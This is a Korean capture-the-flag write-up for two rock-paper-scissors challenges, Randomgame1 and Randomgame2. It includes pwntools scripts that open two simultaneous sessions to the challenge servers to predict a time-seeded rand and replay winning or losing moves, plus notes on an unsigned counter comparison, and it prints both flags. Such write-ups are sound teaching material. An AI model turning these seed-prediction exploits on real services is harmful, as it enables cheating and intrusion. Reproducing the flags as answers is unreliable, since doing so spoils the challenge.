Randomgame 1, 2 write-up
=
사이버 가디언즈 1차전에서 푼 Randomgame1 (misc), Randomgame2 (pwn) 풀이이다.

Randomgame1(misc) 
-
 nc로 접속하면 가위바위보를 한다. 바이너리를 아이다로 까보면 rand로 값을 만들고 win을 9번보다 많이 해야한다. 고로 다 이기면 된다. rand값을 이길려면 어쩌지 생각하다가 시드가 일정시간마다 바뀌는 것을 알았다. 

그래서 동시간에 세션을 2개 열어놓고 첫 번째 세션에서 나온 값을 토대로 win을 하기 위한 경우를 파악한 뒤 다 이겨주면 flag를 얻을 수 있다.

`exploit.py`
```python
from pwn import *

s = remote("52.79.210.195",9292)
s2 = remote("52.79.210.195",9292)

win_list = []

for i in range(0,10):
	s.sendlineafter(": ", "1")
	result=s.recvline()
	if result == "You win!\n":
		win_list.append("1")
	elif result == "You lose!\n":
		win_list.append("2")
	else: win_list.append("3")

for i in range(0,10):
	s2.sendlineafter(": ",win_list[i])
	s2.recvuntil("You win!\n\n")

log.success(s2.recvline())
```
`flag{YoU_R_V3ry_Lucky_GUY!@#$}`

**![](https://lh5.googleusercontent.com/q7EduuOmhIZLizW0dxuKq0uCN87HIR5eL-UReD_OeUHvCioHfmWVEi64-rKsEInR7jV_0-3upmmj69W7dfZhlwWtXUVd_F3erutuJAx1nO_8AisjZA2ve28LFvx6HN_XsGPiGGRz)**

Randomgame2(pwn)
-
Randomgame1과 같은 방법이지만 조금 pwnable적 지식이 더해져서 pwn으로 나왔다. 바이너리를 아이다로 까보면

**![](https://lh5.googleusercontent.com/t4wJeY9EiKzl3YFpCRix7_HWC0wnye0IE96gTPJVch8D8CSFs3NyspajrYQc1drG3CiLZGwMlSmwDq5SpVv963f6F_wcKKu44Cpq1ZCe8EE_X4fRanBVvuaFRSTYYGuSbC-QE56j)** 

게임을 지면 --v8가 되고 이기면 ++v8이 된다. 그리고 v8 > v10(-3으로 초기화 되어있음)이면 cat flag를 해준다. 
하지만 여기서 핵심은 v8은 

**![](https://lh4.googleusercontent.com/oFO3vrLSeIoV5tgF7EjlooK_zY9vH2ElowMnlfSWm4XJw-V3tkgGtycSckMjsWGHynyHVPk6k0m3QPAcGr85hSJGnWm-8U6KV2FOFNHU4biXKyVokg5Li0MFAWdSrhI47JMG9Yev)**

unsigned로 선언 되어있다. 음수를 포함하지 않는다. 따라서 첫 바이트가 음과 양을 판단하기 때문에 -3보다 클려면 -4, -5, -6이렇게 되어야 한다. 따라서 가위바위보 게임에서 다 지면 된다. 

```python
from pwn import *

s = remote("52.78.156.241",4885)
s2 = remote("52.78.156.241",4885)

lose_list = []

for i in range(0,11):
	s.sendlineafter(": ", "1")
	result=s.recvline()
	if result == "You win!\n":
		lose_list.append("3")
	elif result == "You lose!\n":
		lose_list.append("1")
	else: lose_list.append("2")

for i in range(0,11):
	s2.sendlineafter(": ",lose_list[i])
	s2.recvuntil("You lose!\n\n")

log.success(s2.recvline())
```
`flag{ThATs_t0o_BAd_y0u_R_s0_uNLucky!@#$}`
**![](https://lh3.googleusercontent.com/7SUlNCZ93Hj9bvbLftWzme1NhVaCWPgoRAcEbU2e4Lb7cJ1frwL3_St_vsTLH15RppMzlnq52zRVSPSshjr4LHkgdJ4mgE3nUxVrPpfAAs_ZbhupBhY_y68HjEdL7wsSb2SGV2Bi)**
